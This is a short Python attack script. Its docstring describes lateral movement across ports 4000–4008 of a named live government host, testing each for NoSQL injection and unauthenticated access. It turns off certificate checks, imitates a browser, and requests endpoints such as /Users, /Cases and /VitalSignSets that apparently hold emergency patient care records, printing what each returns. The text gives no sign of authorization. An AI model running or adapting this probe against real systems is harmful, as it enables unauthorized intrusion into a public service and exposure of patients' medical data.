#!/usr/bin/env python3
"""
周边端口横向: 测试 4000/4002/4003/4005/4007/4008 是否存在同类 NoSQL 注入/无认证访问
"""
import httpx, urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGETS = [
    "https://epcr.tpf.gov.tw:4000",
    "https://epcr.tpf.gov.tw:4002",
    "https://epcr.tpf.gov.tw:4003",
    "https://epcr.tpf.gov.tw:4005",
    "https://epcr.tpf.gov.tw:4007",
    "https://epcr.tpf.gov.tw:4008",
]

PATHS = [
    "/events", "/imageData", "/trendings", "/config", "/version",
    "/", "/health", "/status", "/Pcrs", "/Dispatches", "/VitalSignSets",
    "/MciCaseRecords", "/MciTypes", "/Hospitals", "/Cases", "/Users",
    "/socket.io/", "/api", "/api/v1", "/swagger", "/docs"
]

print("=== 周边端口横向扫描 ===\n")
for target in TARGETS:
    port = target.split(":")[-1]
    print(f"\n--- Target: {target} ---")
    c = httpx.Client(base_url=target, verify=False, timeout=10,
        headers={"User-Agent":"Mozilla/5.0"})
    for path in PATHS:
        try:
            r = c.get(path)
            size = len(r.text) if r.text else 0
            sample = r.text[:80].replace("\n", " ") if r.text else ""
            print(f"  {path:20s} -> HTTP {r.status_code:3d} ({size}B) {sample}")
        except Exception as e:
            print(f"  {path:20s} -> ERROR: {str(e)[:60]}")
    c.close()
